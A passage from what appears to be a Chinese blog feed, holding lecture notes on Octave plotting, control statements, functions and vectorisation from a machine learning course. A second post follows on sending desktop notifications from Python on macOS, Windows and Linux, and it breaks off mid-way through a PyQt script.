y2。</p><p>subplot命令，我们要使用<code>subplot(1,2,1)</code>，它将图像分为一个1*2的格子，也就是前两个参数，然后它使用第一个格子，也就是最后一个参数1的意思。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212619.png" alt></p><p>我现在使用第一个格子，如果键入<code>plot(t,y1)</code>，现在这个图显示在第一个格子。如果我键入<code>subplot(1,2,2)</code>，那么我就要使用第二个格子，键入<code>plot(t,y2)</code>；现在y2显示在右边，也就是第二个格子。</p><p>最后一个命令，你可以改变轴的刻度，比如改成[0.5 1 -1 1]，输入命令：<code>axis([0.5 1 -1 1])</code>也就是设置了右边图的x轴和y轴的范围。具体而言，它将右图中的横轴的范围调整至0.5到1，竖轴的范围为-1到1。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212619.png" alt></p><p>你不需要记住所有这些命令，如果你需要改变坐标轴，或者需要知道axis命令，你可以用Octave中用help命令了解细节。</p><p>最后，还有几个命令。</p><p><code>clf</code>（清除一幅图像）。</p><p>让我们设置A等于一个5×5的magic方阵：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212706.png" alt></p><p>我有时用一个巧妙的方法来可视化矩阵，也就是imagesc(A)命令，它将会绘制一个5<em>5的矩阵，一个5</em>5的彩色格图，不同的颜色对应A矩阵中的不同值。</p><p>我还可以使用函数colorbar，让我用一个更复杂的命令 <code>imagesc(A)，colorbar，colormap gray</code>。这实际上是在同一时间运行三个命令：运行<code>imagesc</code>，然后运行，<code>colorbar</code><br>然后运行<code>colormap gray</code>。</p><p>它生成了一个颜色图像，一个灰度分布图，并在右边也加入一个颜色条。所以这个颜色条显示不同深浅的颜色所对应的值。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212725.png" alt></p><p>你可以看到在不同的方格，它对应于一个不同的灰度。</p><p>输入<code>imagesc(magic(15))，colorbar，colormap gray</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212735.png" alt></p><p>这将会是一幅15*15的magic方阵值的图。</p><p>最后，总结一下这段视频。你看到我所做的是使用<strong>逗号连接函数调用</strong>。如果我键入a=1,b=2,c=3然后按Enter键，其实这是将这三个命令同时执行，或者是将三个命令一个接一个执行，它将输出所有这三个结果。</p><p>这很像a=1; b=2;c=3;如果我用分号来代替逗号，则没有输出出任何东西。</p><p>这里我们称之为逗号连接的命令或函数调用。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212749.png" alt></p><p>用逗号连接是另一种Octave中更便捷的方式，将多条命令例如imagesc colorbar colormap，将这多条命令写在同一行中。</p><p>现在你知道如何绘制Octave中不同的图像，在下面的视频中，我将告诉你怎样在Octave中，写控制语句，比如if<br>while for语句，并且定义和使用函数。</p><h3 id="5-5-控制语句：for，while，if语句"><a href="#5-5-控制语句：for，while，if语句" class="headerlink" title="5.5 控制语句：for，while，if语句"></a>5.5 控制语句：for，while，if语句</h3><p>在这段视频中，我想告诉你怎样为你的 Octave 程序写控制语句。诸如：”for” “while” “if” 这些语句，并且如何定义和使用方程。</p><p>我先告诉你如何使用 “for” 循环。</p><p>首先，我要将 v 值设为一个10行1列的零向量。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212759.png" alt></p><p>接着我要写一个 “for” 循环，让 i 等于 1 到 10，写出来就是 i = 1:10。我要设 v(i)的值等于 2 的 i 次方，循环最后写上“end”。</p><p>向量 v 的值就是这样一个集合 2的一次方、2的二次方，依此类推。这就是我的 i 等于 1 到 10的语句结构，让 i 遍历 1 到 10的值。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212808.png" alt></p><p>另外，你还可以通过设置你的 indices (索引) 等于 1一直到10，来做到这一点。这时<br>indices 就是一个从1到10的序列。</p><p>你也可以写 <code>i = indices</code>，这实际上和我直接把 i 写到 1 到 10 是一样。你可以写 <code>disp(i)</code>，也能得到一样的结果。所以 这就是一个 “for” 循环。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212815.png" alt></p><p>如果你对 “break” 和 “continue” 语句比较熟悉，Octave里也有 “break” 和 “continue”语句，你也可以在 Octave环境里使用那些循环语句。</p><p>但是首先让我告诉你一个 while 循环是如何工作的：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212838.png" alt></p><p>这是什么意思呢：我让 i 取值从 1 开始，然后我要让 v(i) 等于 100，再让 i 递增 1，直到 i 大于 5停止。</p><p>现在来看一下结果，我现在已经取出了向量的前五个元素，把他们用100覆盖掉，这就是一个while循环的句法结构。</p><p>现在我们来分析另外一个例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212849.png" alt></p><p>这里我将向你展示如何使用break语句。比方说 v(i) = 999，然后让 i = i+1，当 i 等于6的时候 break (停止循环)，结束 (end)。</p><p>当然这也是我们第一次使用一个 if 语句，所以我希望你们可以理解这个逻辑，让 i 等于1 然后开始下面的增量循环，while语句重复设置 v(i) 等于999，不断让i增加，然后当 i 达到6，做一个中止循环的命令，尽管有while循环，语句也就此中止。所以最后的结果是取出向量 v 的前5个元素，并且把它们设置为999。</p><p>所以，这就是if 语句和 while 语句的句法结构。并且要注意要有end，上面的例子里第一个 end 结束的是 if<br>语句，第二个 end 结束的是 while 语句。</p><p>现在让我告诉你使用 if-else 语句：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212859.png" alt></p><p>最后，提醒一件事：如果你需要退出 Octave，你可以键入<code>exit</code>命令然后回车就会退出 Octave，或者命令<code>quit</code>也可以。</p><p>最后，让我们来说说函数 (functions)，如何定义和调用函数。</p><p>我在桌面上存了一个预先定义的文件名为 “squarethisnumber.m”，这就是在 Octave 环境下定义的函数。</p><p>让我们打开这个文件。请注意，我使用的是微软的写字板程序来打开这个文件，我只是想建议你，如果你也使用微软的Windows系统，那么可以使用写字板程序，而不是记事本来打开这些文件。如果你有别的什么文本编辑器也可以，记事本有时会把代码的间距弄得很乱。如果你只有记事本程序，那也能用。我建议你用写字板或者其他可以编辑函数的文本编辑器。</p><p>现在我们来说如何在 Octave 里定义函数：</p><p>这个文件只有三行：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212910.png" alt></p><p>第一行写着 <code>function y = squareThisNumber(x)</code>，这就告诉 Octave，我想返回一个 y值，我想返回一个值，并且返回的这个值将被存放于变量 y 里。另外，它告诉了Octave这个函数有一个参数，就是参数 x，还有定义的函数体，也就是 y 等于 x 的平方。</p><p>还有一种更高级的功能，这只是对那些知道“search path (搜索路径)”这个术语的人使用的。所以如果你想要修改<br>Octave的搜索路径，你可以把下面这部分作为一个进阶知识，或者选学材料，仅适用于那些熟悉编程语言中搜索路径概念的同学。</p><p>你可以使用<code>addpath</code> 命令添加路径，添加路径“C:\Users\ang\desktop”将该目录添加到Octave的搜索路径，这样即使你跑到其他路径底下，Octave依然知道会在 Users\ang\desktop目录下寻找函数。这样，即使我现在在不同的目录下，它仍然知道在哪里可以找到“SquareThisNumber” 这个函数。</p><p>但是，如果你不熟悉搜索路径的概念，不用担心，只要确保在执行函数之前，先用 <code>cd</code>命令设置到你函数所在的目录下，实际上也是一样的效果。</p><p>Octave<br>还有一个其他许多编程语言都没有的概念，那就是它可以允许你定义一个函数，使得返回值是多个值或多个参数。这里就是一个例子，定义一个函数叫：</p><p>“<code>SquareAndCubeThisNumber(x)</code>” (x的平方以及x的立方)</p><p>这说的就是函数返回值是两个： y1 和 y2</p><p>接下来就是y1是被平方后的结果，y2是被立方后的结果，这就是说，函数会真的返回2个值。</p><p>有些同学可能会根据你使用的编程语言，比如你们可能熟悉的C或C++，通常情况下，认为作为函数返回值只能是一个值，但<br>Octave 的语法结构就不一样，可以返回多个值。</p><p>如果我键入 <code>[a,b] = SquareAndCubeThisNumber(5)</code>，然后，a 就等于25，b 就等于5的立方125。</p><p>所以说如果你需要定义一个函数并且返回多个值，这一点常常会带来很多方便。</p><p>最后，我来给大家演示一下一个更复杂一点的函数的例子。</p><p>比方说，我有一个数据集，像这样，数据点为[1,1], [2,2],[3,3]，我想做的事是定义一个 Octave 函数来计算代价函数 $J(\theta)$，就是计算不同 $\theta$值所对应的代价函数值$J$。</p><p>首先让我们把数据放到 Octave 里，我把我的矩阵设置为<code>X = [1 1; 1 2; 1 3];</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212921.png" alt></p><p>请仔细看一下这个函数的定义，确保你明白了定义中的每一步。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212932.png" alt></p><p>现在当我在 Octave 里运行时，我键入$J$ = costFunction$J$ (X, y, theta)，它就计算出 $j$等于0，这是因为如果我的数据集x 为 [1;2;3]， y 也为 [1;2;3] 然后设置 $\theta_0$ 等于0，$\theta_1$等于1，这给了我恰好45度的斜线，这条线是可以完美拟合我的数据集的。</p><p>而相反地，如果我设置theta 等于[0;0]，那么这个假设就是0是所有的预测值，和刚才一样，设置$\theta_0$ = 0，$\theta_1$也等于0，然后我计算的代价函数，结果是2.333。实际上，他就等于1的平方，也就是第一个样本的平方误差，加上2的平方，加上3的平方，然后除以2m，也就是训练样本数的两倍，这就是2.33。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212944.png" alt></p><p>因此这也反过来验证了我们这里的函数，计算出了正确的代价函数。这些就是我们用简单的训练样本尝试的几次试验，这也可以作为我们对定义的代价函数$J$进行了完整性检查。确实是可以计算出正确的代价函数的。至少基于这里的 X和 y是成立的。也就是我们这几个简单的训练集，至少是成立的。</p><p>现在你知道如何在 Octave 环境下写出正确的控制语句，比如 for 循环、while 循环和 if语句，以及如何定义和使用函数。</p><p>在接下来的Octave 教程视频里，我会讲解一下向量化，这是一种可以使你的 Octave程序运行非常快的思想。</p><h3 id="5-6-向量化"><a href="#5-6-向量化" class="headerlink" title="5.6 向量化"></a>5.6 向量化</h3><p>在这段视频中，我将介绍有关向量化的内容，无论你是用Octave，还是别的语言，比如MATLAB或者你正在用Python、NumPy 或 Java C C++，所有这些语言都具有各种线性代数库，这些库文件都是内置的，容易阅读和获取，他们通常写得很好，已经经过高度优化，通常是数值计算方面的博士或者专业人士开发的。</p><p>而当你实现机器学习算法时，如果你能好好利用这些线性代数库，或者数值线性代数库，并联合调用它们，而不是自己去做那些函数库可以做的事情。如果是这样的话，那么通常你会发现：首先，这样更有效，也就是说运行速度更快，并且更好地利用你的计算机里可能有的一些并行硬件系统等等；其次，这也意味着你可以用更少的代码来实现你需要的功能。因此，实现的方式更简单，代码出现问题的有可能性也就越小。</p><p>举个具体的例子：与其自己写代码做矩阵乘法。如果你只在Octave中输入a乘以b就是一个非常有效的两个矩阵相乘的程序。有很多例子可以说明，如果你用合适的向量化方法来实现，你就会有一个简单得多，也有效得多的代码。</p><p>让我们来看一些例子：这是一个常见的线性回归假设函数：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104212956.png" alt></p><p>如果你想要计算$h_\theta(x)$ ，注意到右边是求和，那么你可以自己计算j = 0 到 j = n 的和。但换另一种方式来想想，把 $h_\theta(x)$ 看作$\theta^Tx$，那么你就可以写成两个向量的内积，其中$\theta$就是$\theta_0$、$\theta_1$、$\theta_2$，如果你有两个特征量，如果 n = 2，并且如果你把 x 看作$x_0$、$x_1$、$x_2$，这两种思考角度，会给你两种不同的实现方式。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213010.png" alt></p><p>比如说，这是未向量化的代码实现方式：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213023.png" alt></p><p>计算$h_\theta(x)$是未向量化的，我们可能首先要初始化变量 prediction 的值为0.0，而这个变量prediction 的最终结果就是$h_\theta(x)$，然后我要用一个 for 循环，j 取值 0 到n+1，变量prediction 每次就通过自身加上 theta(j) 乘以 x(j)更新值，这个就是算法的代码实现。</p><p>顺便我要提醒一下，这里的向量我用的下标是0，所以我有$\theta_0$、$\theta_1$、$\theta_2$，但因为MATLAB的下标从1开始，在 MATLAB 中$\theta_0$，我们可能会用 theta(1) 来表示，这第二个元素最后就会变成，theta(2) 而第三个元素，最终可能就用theta(3)表示，因为<strong>MATLAB中的下标从1开始</strong>，这就是为什么这里我的 for 循环，j 取值从 1 直到n+1，而不是从 0 到 n。这是一个未向量化的代码实现方式，我们用一个 for 循环对 n 个元素进行加和。</p><p>作为比较，接下来是向量化的代码实现：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213035.png" alt></p><p>你把x和$\theta$看做向量，而你只需要令变量prediction等于theta转置乘以x，你就可以这样计算。与其写所有这些for循环的代码，你只需要一行代码，这行代码就是利用 Octave 的高度优化的数值，线性代数算法来计算两个向量$\theta$以及x的内积，这样向量化的实现更简单，它运行起来也将更加高效。这就是 Octave 所做的而向量化的方法，在其他编程语言中同样可以实现。</p><p>让我们来看一个C++ 的例子：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213049.png" alt></p><p>与此相反，使用较好的C++数值线性代数库，你可以写出像右边这样的代码，因此取决于你的数值线性代数库的内容。你只需要在C++中将两个向量相乘，根据你所使用的数值和线性代数库的使用细节的不同，你最终使用的代码表达方式可能会有些许不同，但是通过一个库来做内积，你可以得到一段更简单、更有效的代码。</p><p>现在，让我们来看一个更为复杂的例子，这是线性回归算法梯度下降的更新规则：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213104.png" alt></p><p>我们用这条规则对 j 等于 0、1、2等等的所有值，更新对象$\theta_j$，我只是用$\theta_0$、$\theta_1$、$\theta_2$来写方程，假设我们有两个特征量，所以n等于2，这些都是我们需要对$\theta_0$、$\theta_1$、$\theta_2$进行更新，这些都应该是同步更新，我们用一个向量化的代码实现，这里是和之前相同的三个方程，只不过写得小一点而已。</p><p>你可以想象实现这三个方程的方式之一，就是用一个 for 循环，就是让 j等于0、等于1、等于2，来更新$\theta_j$。但让我们用向量化的方式来实现，看看我们是否能够有一个更简单的方法。基本上用三行代码或者一个for 循环，一次实现这三个方程。让我们来看看怎样能用这三步，并将它们压缩成一行向量化的代码来实现。做法如下：</p><p>我打算把$\theta$看做一个向量，然后我用$\theta$-$\alpha$ 乘以某个别的向量$\delta$ 来更新$\theta$。</p><p>这里的 $\delta$  等于</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213122.png" alt></p><p>让我解释一下是怎么回事：我要把$\theta$看作一个向量，有一个 n+1 维向量，$\alpha$ 是一个实数，$\delta$在这里是一个向量。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213132.png" alt></p><p>所以这个减法运算是一个向量减法，因为 $\alpha$ 乘以 δ是一个向量，所以$\theta$就是$\theta$ - $\alpha \delta$得到的向量。</p><p>那么什么是向量 $\delta$ 呢 ?</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213143.png" alt></p><p>$X^{(i)}$是一个向量</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213203.png" alt></p><p>你就会得到这些不同的式子，然后作加和。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213216.png" alt></p><p>实际上，在以前的一个小测验，如果你要解这个方程，我们说过为了向量化这段代码，我们会令<code>u = 2v +5w</code>因此，我们说向量u等于2乘以向量v加上5乘以向量w。用这个例子说明，如何对不同的向量进行相加，这里的求和是同样的道理。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213230.png" alt></p><p>这就是为什么我们能够向量化地实现线性回归。</p><p>所以，我希望步骤是有逻辑的。请务必看视频，并且保证你确实能理解它。如果你实在不能理解它们数学上等价的原因，你就直接实现这个算法，也是能得到正确答案的。所以即使你没有完全理解为何是等价的，如果只是实现这种算法，你仍然能实现线性回归算法。如果你能弄清楚为什么这两个步骤是等价的，那我希望你可以对向量化有一个更好的理解，如果你在实现线性回归的时候，使用一个或两个以上的特征量。</p><p>有时我们使用几十或几百个特征量来计算线性归回，当你使用向量化地实现线性回归，通常运行速度就会比你以前用你的for循环快的多，也就是自己写代码更新$\theta_0$、$\theta_1$、$\theta_2$。</p><p>因此使用向量化实现方式，你应该是能够得到一个高效得多的线性回归算法。而当你向量化我们将在之后的课程里面学到的算法，这会是一个很好的技巧，无论是对于Octave 或者一些其他的语言 如C++、Java 来让你的代码运行得更高效。</p><h3 id="5-7-工作和提交的编程练习"><a href="#5-7-工作和提交的编程练习" class="headerlink" title="5.7 工作和提交的编程练习"></a>5.7 工作和提交的编程练习</h3><p>在这段视频中，我想很快地介绍一下这门课程做作业的流程，以及如何使用作业提交系统。这个提交系统可以即时检验你的机器学习程序答案是否正确。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213243.png" alt></p><p>在’ml-class-ex1’目录中，我们提供了大量的文件，其中有一些需要由你自己来编辑，因此第一个文件应该符合编程练习中pdf文件的要求，其中一个我们要求你编写的文件是warmUpExercise.m这个文件，这个文件只是为了确保你熟悉提交系统。</p><p>你需要做的就是提交一个5×5的矩阵，就是<code>A = eye(5)</code>这将修改该函数以产生5×5的单位矩阵，现在warmUpExercise()这个方程就实现了返回5x5的单位矩阵，将它保存一下，所以我已经完成了作业的第一部分。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213256.png" alt></p><p>现在回到我的 Octave 窗口，现在来到我的目录C:\Users\ang\Desktop\ml-class-ex1如果我想确保我已经实现了程序 像这样输入’warmUpExercise()’好了它返回了我们用刚才写的代码创建的一个5x5的单位矩阵</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213306.png" alt></p><p>我现在可以按如下步骤提交代码，我要在这里目录下键入<code>submit()</code>。我要提交第一部分 所以我选择输入’1’。这时它问我的电子邮件地址，我们打开课程网站，输入用户名密码。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104213327.png" alt></p><p>按下回车键，它连接到服务器，并将其提交，然后它就会立刻告诉你：恭喜您！已成功完成作业1第1部分。这就确认了你已经做对了第一部分练习，如果你提交的答案不正确，那么它会给你一条消息，说明你没有完全答对，您还可以继续使用此提交密码，也可以生成新密码。你的密码是否会显示出来取决于你使用的操作系统。<br>这就是提交作业的方法，你完成家庭作业的时候，我希望你都能答对。</p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
          <category> 机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> octave </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python调用通知中心</title>
      <link href="/2018/12/01/python-diao-yong-tong-zhi-zhong-xin/"/>
      <url>/2018/12/01/python-diao-yong-tong-zhi-zhong-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h2><blockquote><p>mac参考: <a href="https://stackoverflow.com/questions/17651017/python-post-osx-notification/41318195#41318195" target="_blank" rel="noopener">https://stackoverflow.com/questions/17651017/python-post-osx-notification/41318195#41318195</a></p></blockquote><h3 id="法一-安装terminal-nofifier-推荐"><a href="#法一-安装terminal-nofifier-推荐" class="headerlink" title="法一:安装terminal-nofifier(推荐)"></a>法一:安装terminal-nofifier(推荐)</h3><h4 id="Ruby安装"><a href="#Ruby安装" class="headerlink" title="Ruby安装"></a>Ruby安装</h4><pre><code>sudo gem install terminal-notifier</code></pre><a id="more"></a><h4 id="Homebrew安装"><a href="#Homebrew安装" class="headerlink" title="Homebrew安装"></a>Homebrew安装</h4><pre><code>brew install terminal-notifier</code></pre><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ul><li>所以用法看官网 <a href="https://github.com/julienXX/terminal-notifier" target="_blank" rel="noopener">https://github.com/julienXX/terminal-notifier</a></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">notify</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> subtitle<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''调用系统提醒,即所谓的系统通知,需要安装terminal-notifier'''</span>    <span class="token comment" spellcheck="true"># 标题</span>    title <span class="token operator">=</span> <span class="token string">'-title {!r}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>title<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 子标题</span>    subtitle <span class="token operator">=</span> <span class="token string">'-subtitle {!r}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>subtitle<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 消息</span>    message <span class="token operator">=</span> <span class="token string">'-message {!r}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>message<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 默认提示音</span>    sound <span class="token operator">=</span> <span class="token string">'-sound default'</span>    <span class="token comment" spellcheck="true"># 自定义icon   -appIcon http://vjeantet.fr/images/logo.png</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>        <span class="token string">'terminal-notifier {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>message<span class="token punctuation">,</span> title<span class="token punctuation">,</span> subtitle<span class="token punctuation">,</span> sound<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notify<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'标题'</span><span class="token punctuation">,</span>       subtitle<span class="token operator">=</span><span class="token string">'子标题'</span><span class="token punctuation">,</span>       message<span class="token operator">=</span><span class="token string">'内容'</span><span class="token punctuation">)</span></code></pre><h3 id="法二-oaascript"><a href="#法二-oaascript" class="headerlink" title="法二:oaascript"></a>法二:oaascript</h3><blockquote><p>该方法自定义图标以及添加提示音有点麻烦</p></blockquote><ol><li>调用通知中心弹出消息</li></ol><pre><code>osascript -e &#39;display notification &quot;内容&quot; with title &quot;标题&quot;&#39;</code></pre><ol start="2"><li>调用某应用弹出消息</li></ol><pre><code>osascript -e &#39;tell app &quot;Mail&quot; to display dialog &quot;该发周报了！&quot; with title &quot;提示&quot;</code></pre><p>其中Mail可以改为对应的app名称（非Launchpad上显示的名称，而是 ‘xxx.app’中’.app’前面的名称）</p><ol start="3"><li>然后在python中使用如下命令便可弹出提示</li></ol><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> subprocesstitle <span class="token operator">=</span> <span class="token string">"这个是标题"</span>content <span class="token operator">=</span> <span class="token string">"这个是内容"</span><span class="token comment" spellcheck="true"># 执行AppleScripts命令， osascript -e 'display notification "内容" with title "标题"'</span>cmd <span class="token operator">=</span> <span class="token string">'display notification "%s" with title "%s"'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>content<span class="token punctuation">,</span> title<span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"osascript"</span><span class="token punctuation">,</span> <span class="token string">"-e"</span><span class="token punctuation">,</span> cmd<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h3 id="法三-ntfy"><a href="#法三-ntfy" class="headerlink" title="法三:ntfy"></a>法三:ntfy</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>pip3 install ntfy</code></pre><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><ul><li>用法看官网: <a href="https://github.com/dschep/ntfy#backends" target="_blank" rel="noopener">https://github.com/dschep/ntfy#backends</a></li><li>简单的python如下:</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">notification</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd <span class="token operator">=</span> <span class="token string">'ntfy -t {0} send {1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>title<span class="token punctuation">,</span> message<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>notification<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> <span class="token string">"content"</span><span class="token punctuation">)</span></code></pre><h3 id="法四-Foundation"><a href="#法四-Foundation" class="headerlink" title="法四:Foundation"></a>法四:Foundation</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Foundation <span class="token keyword">import</span> NSUserNotification<span class="token keyword">from</span> Foundation <span class="token keyword">import</span> NSUserNotificationCenter<span class="token keyword">from</span> Foundation <span class="token keyword">import</span> NSUserNotificationDefaultSoundName<span class="token keyword">class</span> <span class="token class-name">Notification</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">notify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> _title<span class="token punctuation">,</span> _message<span class="token punctuation">,</span> _sound<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_title <span class="token operator">=</span> _title        self<span class="token punctuation">.</span>_message <span class="token operator">=</span> _message        self<span class="token punctuation">.</span>_sound <span class="token operator">=</span> _sound        self<span class="token punctuation">.</span>notification <span class="token operator">=</span> NSUserNotification<span class="token punctuation">.</span>alloc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>notification<span class="token punctuation">.</span>setTitle_<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_title<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>notification<span class="token punctuation">.</span>setInformativeText_<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_message<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_sound <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>notification<span class="token punctuation">.</span>setSoundName_<span class="token punctuation">(</span>NSUserNotificationDefaultSoundName<span class="token punctuation">)</span>        center <span class="token operator">=</span> NSUserNotificationCenter<span class="token punctuation">.</span>defaultUserNotificationCenter<span class="token punctuation">(</span><span class="token punctuation">)</span>        center<span class="token punctuation">.</span>deliverNotification_<span class="token punctuation">(</span>self<span class="token punctuation">.</span>notification<span class="token punctuation">)</span>N <span class="token operator">=</span> Notification<span class="token punctuation">(</span><span class="token punctuation">)</span>N<span class="token punctuation">.</span>notify<span class="token punctuation">(</span>_title<span class="token operator">=</span><span class="token string">"SOME"</span><span class="token punctuation">,</span> _message<span class="token operator">=</span><span class="token string">"Something"</span><span class="token punctuation">,</span> _sound<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><blockquote><p>用到<code>win10toast</code></p></blockquote><h3 id="安装win10toast"><a href="#安装win10toast" class="headerlink" title="安装win10toast"></a>安装win10toast</h3><pre><code>pip3 install win10toast</code></pre><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> win10toast <span class="token keyword">import</span> ToastNotifiertoaster <span class="token operator">=</span> ToastNotifier<span class="token punctuation">(</span><span class="token punctuation">)</span>toaster<span class="token punctuation">.</span>show_toast<span class="token punctuation">(</span><span class="token string">"Hello world!!"</span><span class="token punctuation">,</span><span class="token string">"Python is good"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 详细用法</span><span class="token comment" spellcheck="true"># duration=10代表10s后消失,改为-1则留在通知中心</span>toaster<span class="token punctuation">.</span>show_toast<span class="token punctuation">(</span><span class="token string">"hello world!!"</span><span class="token punctuation">,</span><span class="token string">"python is good"</span><span class="token punctuation">,</span>icon_path<span class="token operator">=</span><span class="token string">"custom.ico"</span><span class="token punctuation">,</span>duration<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span></code></pre><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="法一-notify-send"><a href="#法一-notify-send" class="headerlink" title="法一:notify-send"></a>法一:notify-send</h3><pre><code>import ostitle = &quot;这个是标题&quot;content = &quot;这个是内容&quot;# 执行命令notify-send -i [ icon ] &lt;title&gt;  [ message]cmd = &quot;sudo notify-send &#39;%s&#39; &#39;%s&#39;&quot; % (title, content)os.system(cmd)</code></pre><h3 id="法二-ntfy"><a href="#法二-ntfy" class="headerlink" title="法二:ntfy"></a>法二:ntfy</h3><ul><li>具体用法参考在刚刚mac系统处已经说明</li></ul><h2 id="pyqt自定义"><a href="#pyqt自定义" class="headerlink" title="pyqt自定义"></a>pyqt自定义</h2><ul><li>脚本参考: <a href="https://github.com/kindlychung/PopupBubble" target="_blank" rel="noopener">https://github.com/kindlychung/PopupBubble</a></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Date    : 2018-11-29 15:16:30</span><span class="token comment" spellcheck="true"># @Author  : 江南小虫虫 (fwh13612265462@gmail.com)</span><span class="token comment" spellcheck="true"># @Link    : http://www.fengwenhua.top</span><span class="token comment" spellcheck="true"># @Version : $Id$</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> time<span class="token keyword">from</span> PyQt5 <span class="token keyword">import</span> QtCore<span class="token punctuation">,</span> QtGui<span class="token 